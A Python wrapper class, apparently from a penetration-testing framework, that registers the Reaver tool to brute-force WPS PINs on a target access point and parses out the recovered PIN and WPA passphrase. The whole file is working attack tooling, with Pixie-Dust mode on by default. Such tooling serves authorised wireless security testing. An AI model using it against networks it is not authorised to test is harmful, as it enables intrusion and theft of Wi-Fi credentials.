"""Reaver WPS PIN brute-force attack tool wrapper."""

from __future__ import annotations

import re
from typing import Any, Dict

from app.tools.base import (
    AuthLevel,
    BaseTool,
    ToolCategory,
    ToolMetadata,
    ToolParameter,
    ToolResult,
)
from app.tools.executor import SubprocessExecutor
from app.tools.registry import ToolRegistry


class ReaverTool(BaseTool):
    """Wrapper around Reaver for WPS PIN brute-force attacks.

    Exploits WPS protocol vulnerabilities to recover WPA/WPA2
    passphrases.  Supports both standard brute-force and the
    accelerated Pixie-Dust offline attack (``-K``).
    """

    def __init__(self) -> None:
        self._executor = SubprocessExecutor()

    def metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="reaver",
            display_name="Reaver WPS",
            category=ToolCategory.wifi,
            description=(
                "WPS PIN brute force attack tool. Exploits WPS protocol "
                "vulnerabilities to recover WPA/WPA2 passphrases."
            ),
            capabilities=["wps_bruteforce", "wps_pixie_dust"],
            auth_level=AuthLevel.high,
            parameters=[
                ToolParameter(
                    name="interface",
                    type="string",
                    required=True,
                    description="Monitor-mode wireless interface (e.g. wlan0mon).",
                ),
                ToolParameter(
                    name="bssid",
                    type="string",
                    required=True,
                    description="Target access-point BSSID.",
                ),
                ToolParameter(
                    name="channel",
                    type="integer",
                    required=False,
                    description="WiFi channel of the target AP.",
                ),
                ToolParameter(
                    name="pixie_dust",
                    type="boolean",
                    required=False,
                    default=True,
                    description="Use Pixie-Dust offline WPS attack (-K).",
                ),
                ToolParameter(
                    name="timeout",
                    type="integer",
                    required=False,
                    default=600,
                    description="Maximum seconds to run before stopping.",
                ),
            ],
            binary_path="/usr/bin/reaver",
            estimated_duration="minutes",
        )

    # ------------------------------------------------------------------ #
    #  Execute
    # ------------------------------------------------------------------ #

    async def execute(self, params: Dict[str, Any]) -> ToolResult:
        interface: str = params["interface"]
        bssid: str = params["bssid"]
        channel: int | None = params.get("channel")
        pixie_dust: bool = params.get("pixie_dust", True)
        timeout: int = params.get("timeout", 600)

        cmd = ["reaver", "-i", interface, "-b", bssid, "-vvv"]

        if channel is not None:
            cmd.extend(["-c", str(channel)])

        if pixie_dust:
            cmd.append("-K")

        result = await self._executor.execute(cmd, timeout=timeout)
        result.tool_name = "reaver"
        result.structured_output = self.parse_output(result.raw_output)
        return result

    # ------------------------------------------------------------------ #
    #  Parse
    # ------------------------------------------------------------------ #

    def parse_output(self, raw: str) -> Dict[str, Any]:
        """Extract WPS PIN, WPA PSK, and progress from reaver output."""
        parsed: Dict[str, Any] = {}

        # --- WPS PIN ------------------------------------------------------ #
        pin_match = re.search(r"WPS PIN:\s*'?(\d+)'?", raw)
        if pin_match:
            parsed["wps_pin"] = pin_match.group(1)

        # --- WPA PSK (passphrase) ----------------------------------------- #
        psk_match = re.search(r"WPA PSK:\s*'(.+?)'", raw)
        if psk_match:
            parsed["wpa_psk"] = psk_match.group(1)

        # --- AP SSID ------------------------------------------------------ #
        ssid_match = re.search(r"AP SSID:\s*'(.+?)'", raw)
        if ssid_match:
            parsed["ap_ssid"] = ssid_match.group(1)

        # --- Progress (percentage tried) ---------------------------------- #
        progress_matches = re.findall(r"(\d+\.?\d*)%\s+complete", raw)
        if progress_matches:
            parsed["progress_percent"] = float(progress_matches[-1])

        # --- Pixie-Dust results ------------------------------------------- #
        if re.search(r"Pixie-Dust", raw, re.IGNORECASE):
            parsed["pixie_dust_attempted"] = True
            if re.search(r"Pixie-Dust.*success", raw, re.IGNORECASE):
                parsed["pixie_dust_success"] = True
            else:
                parsed["pixie_dust_success"] = False

        return parsed


# Auto-register
ToolRegistry.register(ReaverTool())
